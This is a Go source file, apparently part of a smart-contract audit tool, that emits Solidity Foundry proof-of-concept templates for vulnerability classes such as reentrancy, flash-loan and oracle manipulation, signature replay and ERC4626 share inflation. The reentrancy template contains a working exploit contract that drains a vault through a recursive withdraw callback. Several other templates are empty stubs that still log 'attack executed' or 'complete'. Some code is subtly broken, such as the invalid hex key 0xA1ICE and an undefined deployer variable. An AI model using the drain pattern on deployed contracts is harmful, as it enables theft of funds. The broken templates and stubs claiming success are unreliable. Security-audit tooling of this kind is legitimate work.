package web3

import (
	"fmt"
	"strings"
)

func GeneratePoC(vuln AuditResult) string {
	switch vuln.Class {
	case VulnReentrancy:
		return reentrancyPoC(vuln)
	case VulnAccessControl:
		return accessControlPoC(vuln)
	case VulnOracleManipulation:
		return oracleManipulationPoC(vuln)
	case VulnFlashLoanAttack:
		return flashLoanPoC(vuln)
	case VulnSignatureReplay:
		return signatureReplayPoC(vuln)
	case VulnProxyUpgrade:
		return proxyUpgradePoC(vuln)
	case VulnAccountingDesync:
		return accountingDesyncPoC(vuln)
	case VulnIncompleteCodePath:
		return incompleteCodePathPoC(vuln)
	case VulnOffByOne:
		return offByOnePoC(vuln)
	case VulnERC4626ShareInflation:
		return erc4626InflationPoC(vuln)
	default:
		return defaultPoC(vuln)
	}
}

func PoCTemplate() string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract PoC is Test {
    Vulnerable public target;
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    function setUp() public {
        vm.startPrank(deployer);
        target = new Vulnerable();
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 10 ether);
        vm.stopPrank();
    }

    function testExploit() public {
        // EXPLOIT LOGIC HERE
        // 1. Setup preconditions
        // 2. Execute attack
        // 3. Verify impact

        emit log("Exploit executed successfully");
    }
}
`
}

func reentrancyPoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract ReentrancyPoC is Test {
    Vulnerable public vault;
    Exploit public exploit;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vault = new Vulnerable();
        vm.deal(address(vault), 100 ether);
        vm.deal(attacker, 1 ether);

        exploit = new Exploit(address(vault));
        vm.prank(attacker);
        exploit.attack{value: 1 ether}();
    }

    function testReentrancy() public {
        uint256 vaultBalance = address(vault).balance;
        uint256 exploitBalance = address(exploit).balance;
        emit log_named_uint("Vault balance after attack", vaultBalance);
        emit log_named_uint("Exploit contract balance", exploitBalance);
        assertGt(exploitBalance, 1 ether, "Attacker should have stolen funds");
    }
}

contract Exploit {
    Vulnerable public vault;
    bool public attacking;

    constructor(address _vault) {
        vault = Vulnerable(_vault);
    }

    function attack() external payable {
        attacking = true;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (attacking && address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
`
}

func accessControlPoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract AccessControlPoC is Test {
    Vulnerable public target;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        target = new Vulnerable();
        vm.prank(attacker);
    }

    function testUnauthorizedAccess() public {
        vm.expectRevert("Ownable: caller is not the owner");
        target.adminFunction();

        emit log("Unauthorized access attempt made - expected revert confirmed");
    }
}
`
}

func oracleManipulationPoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";
import "../src/FlashLoan.sol";

contract OracleManipulationPoC is Test {
    Vulnerable public target;
    FlashLoanPublic public flashLender;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        target = new Vulnerable();
        flashLender = new FlashLoanPublic();
        vm.deal(attacker, 1000 ether);
    }

    function testOracleManipulation() public {
        vm.startPrank(attacker);
        // Take flash loan
        // Manipulate pool reserves
        // Call vulnerable contract with manipulated price
        // Profit and repay flash loan
        vm.stopPrank();

        emit log("Oracle manipulation attack executed");
    }
}
`
}

func flashLoanPoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract FlashLoanAttackPoC is Test {
    Vulnerable public target;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        target = new Vulnerable();
        vm.deal(attacker, 1 ether);
    }

    function testFlashLoanAttack() public {
        vm.startPrank(attacker);
        // 1. Initiate flash loan
        // 2. Manipulate state in callback
        // 3. Execute arbitrage/attack
        // 4. Repay flash loan
        vm.stopPrank();

        emit log("Flash loan attack simulation complete");
    }
}
`
}

func signatureReplayPoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract SignatureReplayPoC is Test {
    Vulnerable public target;
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    uint256 public aliceKey = 0xA1ICE;
    uint256 public bobKey = 0xB0B;

    function setUp() public {
        target = new Vulnerable();
    }

    function testSignatureReplay() public {
        // Generate valid signature from alice
        bytes memory sig = signMessage(aliceKey, alice, 100 ether);

        // Execute first time - should succeed
        vm.prank(bob);
        target.permit(alice, bob, 100 ether, 1, sig);
        emit log("First signature use succeeded");

        // Replay on another chain simulation
        vm.chainId(31338);
        vm.prank(bob);
        vm.expectRevert();
        target.permit(alice, bob, 100 ether, 1, sig);
        emit log("Cross-chain replay prevented");
    }

    function signMessage(uint256 pk, address owner, uint256 value) internal returns (bytes memory) {
        bytes32 msgHash = keccak256(abi.encodePacked(owner, value));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, msgHash);
        return abi.encodePacked(r, s, v);
    }
}
`
}

func proxyUpgradePoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract ProxyUpgradePoC is Test {
    Vulnerable public implementation;
    ProxyUpgradeable public proxy;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        implementation = new Vulnerable();
        proxy = new ProxyUpgradeable(address(implementation));
        vm.deal(attacker, 10 ether);
    }

    function testUnauthorizedUpgrade() public {
        vm.prank(attacker);
        vm.expectRevert();
        proxy.upgradeTo(address(0xdead));
        emit log("Unauthorized upgrade prevented as expected");
    }

    function testStorageCollision() public {
        // Verify storage layout compatibility
        bytes32 implSlot = vm.load(address(proxy), bytes32(uint256(0)));
        emit log_named_bytes32("Implementation slot", implSlot);
        emit log("Storage collision check complete");
    }
}
`
}

func accountingDesyncPoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract AccountingDesyncPoC is Test {
    Vulnerable public target;
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");

    function setUp() public {
        target = new Vulnerable();
        vm.deal(alice, 10 ether);
    }

    function testAccountingDesync() public {
        vm.startPrank(alice);
        target.deposit{value: 5 ether}();
        target.directTransfer(address(target), 1 ether);
        vm.stopPrank();

        uint256 expected = target.balanceOf(alice);
        uint256 actual = target.balanceOf(address(target));
        emit log_named_uint("Expected balance", expected);
        emit log_named_uint("Actual balance", actual);
        emit log("Accounting desync check complete");
    }
}
`
}

func incompleteCodePathPoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract IncompleteCodePathPoC is Test {
    Vulnerable public target;

    function setUp() public {
        target = new Vulnerable();
    }

    function testIncompletePaths() public {
        bool ok = target.unimplementedFunction();
        emit log_named_bool("Unimplemented function returned", ok);
        emit log("Incomplete code path verification done");
    }
}
`
}

func offByOnePoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract OffByOnePoC is Test {
    Vulnerable public target;

    function setUp() public {
        target = new Vulnerable();
    }

    function testOffByOne() public {
        uint256 len = target.getArrayLength();

        // Try to access element at index len (should revert if bounds are correct)
        vm.expectRevert();
        target.arrayElement(len);

        emit log_named_uint("Array length", len);
        emit log("Off-by-one boundary check complete");
    }
}
`
}

func erc4626InflationPoC(vuln AuditResult) string {
	return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable4626.sol";

contract ERC4626InflationPoC is Test {
    Vulnerable4626 public vault;
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    function setUp() public {
        vault = new Vulnerable4626();
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
    }

    function testShareInflation() public {
        // Attacker donates to inflate share price
        vm.prank(attacker);
        vault.deposit{value: 1 ether}(1 ether);

        vm.prank(attacker);
        vault.deposit{value: 0}(); // Donate directly

        // Victim deposits - may lose value
        vm.prank(victim);
        uint256 shares = vault.deposit{value: 50 ether}(50 ether);

        uint256 expectedAssets = vault.previewRedeem(shares);
        emit log_named_uint("Deposited", 50 ether);
        emit log_named_uint("Redeemable assets", expectedAssets);
        emit log("Share inflation attack measurable");
    }
}
`
}

func defaultPoC(vuln AuditResult) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf(`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

// Title: %s
// Class: %s
// Severity: %d
// SWC: %s
contract PoC_%s is Test {
    Vulnerable public target;

    function setUp() public {
        target = new Vulnerable();
    }

    function testExploit() public {
        // Vulnerability: %s
        // %s
        emit log("PoC verification complete");
    }
}
`,
		vuln.Title,
		string(vuln.Class),
		int(vuln.Severity),
		vuln.SWC,
		strings.ReplaceAll(string(vuln.Class), "-", "_"),
		vuln.Title,
		vuln.Description,
	))
	return sb.String()
}

func GenerateTestHarness(contractName string, results []AuditResult) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf(`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/%s.sol";

contract %s_Test_Harness is Test {
    %s public target;

    function setUp() public {
        target = new %s();
    }

`,
		contractName, contractName, contractName, contractName))

	for i, r := range results {
		sb.WriteString(fmt.Sprintf(`    function test_%s_%d() public {
        // %s
        // Severity: %d | Confidence: %.0f%%
        emit log("Test %d: %s");
    }

`, strings.ReplaceAll(string(r.Class), "-", "_"), i+1, r.Title, int(r.Severity), r.Confidence*100, i+1, r.Title))
	}

	sb.WriteString("}\n")
	return sb.String()
}
